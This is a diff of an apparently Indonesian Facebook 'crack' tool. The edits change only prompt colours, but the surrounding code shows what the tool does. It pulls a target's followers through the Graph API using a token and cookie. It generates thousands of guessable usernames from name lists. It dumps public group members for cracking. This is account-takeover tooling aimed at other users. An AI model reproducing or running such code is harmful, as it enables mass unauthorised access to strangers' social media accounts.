@@ -885,7 +885,7 @@ def pengikut():
 		exit()
 	ses = requests.Session()
 	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,padding=(0,7),style=f"bold white"))
-	akun = console.input(f' {P}[{H}+{P}] \33[1;96mMasukan Id Target : {P}')
+	akun = console.input(f' [bold white][[bold cyan]+[bold white]] [bold cyan]Masukan Id Target : [P]')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
@@ -909,7 +909,7 @@ def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"  \33[1;96m  Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
+	cetak(panel(f"    {O}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
 	nam = console.input(f' {P}[{H}+{P}] \33[1;96mMasukan Nama : {P}').split(",")
 	for ser in nam:		
 		for belakang in custom:
@@ -976,8 +976,8 @@ def crack_email():
 		
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
-	cetak(nel('\33[1;96m Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
-	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : ')
+	cetak(nel('{O} Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
+	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : {P}')
 	url = "https://mbasic.facebook.com/groups/"+link
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
